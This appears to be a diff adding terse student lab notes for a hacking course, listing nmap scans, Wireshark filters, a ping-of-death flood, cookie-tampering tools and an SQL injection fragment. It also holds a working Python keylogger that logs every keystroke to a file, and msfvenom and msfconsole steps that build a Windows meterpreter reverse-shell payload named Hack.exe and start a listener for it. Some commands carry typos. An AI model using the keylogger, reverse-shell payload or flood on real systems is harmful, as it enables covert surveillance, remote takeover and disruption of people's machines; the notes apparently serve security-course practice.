@@ -1,0 +1,58 @@
+prac3
+
+tracert www.prestashop.com
+
+
+prac4
+scanme.nmap.org
+nmap -T4 -A -v scanme.nmap.org
+map -p22,113,139 scanme.nmap.org
+nmap sS -T4 scanme.nmap.org
+nmap -sF -T4 para
+nmap -sN -p22 scanme.nmap.org
+nmap -sX -T4 scanme.nmap.org
+
+prac5/wireshark
+http.request.method==”POST” 
+eth.addr == ______________
+
+prac5B
+Ping 172.18.0.132 -t -l 65500 PingByDeath//nemesy3 do same
+
+prac7
+EditThisCookie2
+Tamper Data for FF Quantum
+
+prac8
+1=1:--
+
+prac9
+python -m pip install pynput
+python -m pip install pywin32
+
+from pynput.keyboard import Key, Listener
+import logging
+log_dir = ""
+logging.basicConfig(filename=(log_dir+"Keylog.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s')
+def on_press(key):
+	logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+	listener. join()
+
+prac10
+apt install metasploit-framework
+apt update
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.159 lport=4444 -f exe -ax86 > Hack.exe
+msfconsole
+msf5>use exploit/multi/handler
+msf5 exploit(multi/handler)>set payload android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler)>>set lhost 192.168.43.159
+msf5 exploit(multi/handler)>>set lport 4444
+msf5 exploit(multi/handler)>>show options
+msf5>use exploit/multi/handler
+msf5 exploit(multi/handler)>set payload android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler)>>set rhost 192.168.43.99
+msf5 exploit(multi/handler)>>set rport 80
+msf5 exploit(multi/handler)>>show options
+
+screenshot
